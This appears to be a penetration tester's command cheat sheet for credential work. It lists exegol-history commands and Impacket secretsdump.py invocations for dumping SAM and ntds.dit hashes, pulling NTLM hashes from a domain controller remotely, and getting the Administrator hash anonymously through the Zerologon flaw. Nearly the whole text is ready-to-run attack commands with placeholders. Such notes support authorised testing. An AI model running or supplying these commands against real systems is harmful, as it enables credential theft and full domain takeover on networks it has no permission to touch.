# creds

#creds
## exegol-history - add hosts
```
exh add hosts --ip <target_ip> -n <dc_fqdn> -r <role>
```

## exegol-history - add creds
```
exh add creds -u <user> -H $(ntlm_hash <password>) -p <password> -d <domain>
```

## exegol-history - import kdbx creds
```
exh import creds -f <kdbx-file> --format KDBX --kdbx-password <kdbx-password>
```

## secretsdump
```
secretsdump.py <domain>/<user>:<password>@<ip>
```

## secretsdump local dump - extract hash from sam database
```
secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump local dump - extract hash from ntds.dit
```
secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
```

## secretsdump - anonymous get administrator 
zerologon
```
secretsdump.py <domain>/<dc_fqdn>\$/@<ip> -no-pass -just-dc-user "Administrator"
```

## secretsdump - remote extract
```
secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```

## secretsdump - remote extract + users infos
```
secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```


